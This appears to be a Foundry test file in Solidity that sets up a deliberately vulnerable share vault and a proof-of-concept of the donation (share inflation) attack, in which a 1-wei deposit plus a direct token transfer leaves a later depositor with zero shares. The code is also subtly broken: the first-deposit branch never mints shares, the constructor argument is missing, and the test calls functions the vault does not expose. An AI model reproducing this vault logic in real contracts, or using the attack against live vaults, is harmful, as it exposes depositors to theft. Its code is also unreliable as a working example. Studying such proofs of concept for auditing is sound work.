// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "forge-std/src/Test.sol";
import {Token} from "else/TokenERC20.sol";
import {IERC20} from "interfaces/IERC20.sol";

contract Vault {
    IERC20 token;
    uint256 totalSupply;
    mapping(address => uint) balanceOf;

    constructor (address _token) {
        token = IERC20(_token);
    }

    function _mint(address _to, uint _shares) private {
        totalSupply += _shares;
        balanceOf[_to] += _shares;
    }

    function _burn(address _from, uint _shares) private {
        totalSupply -= _shares;
        balanceOf[_from] -= _shares;
    }

    function deposit(uint256 amount) external {
        uint256 shares;

        if (totalSupply == 0) {
            totalSupply = shares;
        }
        else {
            shares = (totalSupply * amount) / token.balanceOf(address(this));
        }

        _mint(msg.sender, shares);
        token.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 _shares) external returns(uint256) {
        uint amount = (_shares * token.balanceOf(address(this))) / totalSupply;
        _burn(msg.sender, _shares);
        token.transfer(msg.sender, amount);
        return amount;
    }
}

uint8 constant DECIMALS = 18;

contract AttackPOC is Test {
    Vault vault;
    Token token; 

    address[] private users = [address(11), address(12)];

    function setUp () public {
        token = new Token();
        vault = new Vault();


        // fill the tokens and put approvals so its not a problem for the demo
        for (uint i=0;i<users.length;i++) {
            token.mint(users[i], 10000 * (10 ** DECIMALS));
            vm.prank(users[i]);
            token.approve(address(vault), type(uint256).max);
        }
    }

    function test() public {
        // normal deposit
        vm.startPrank(users[0]);
        vault.deposit(1);
        print();

        // we do a donation to inflate the vaults balance
        token.transfer(address(vault), 100 * (10**DECIMALS));
        vm.stopPrank();
        print();

        // user 1 wont be able to get his shares due to rounding issues
        vm.prank(users[1]);
        vault.deposit(100 * (10 ** DECIMALS));
        print();
    }   

    function print() private {
        console2.log("vault total supply", vault.totalSupply());
        console2.log("vault balance", token.balanceOf(address(vault)));
        uint256 shares0 = vault.balanceOf(users[0]);
        uint256 shares1 = vault.balanceOf(users[1]);
        console2.log("users[0] shares", shares0);
        console2.log("users[1] shares", shares1);
        console2.log("users[0] redeemable", vault.previewRedeem(shares0));
        console2.log("users[1] redeemable", vault.previewRedeem(shares1));
    }
}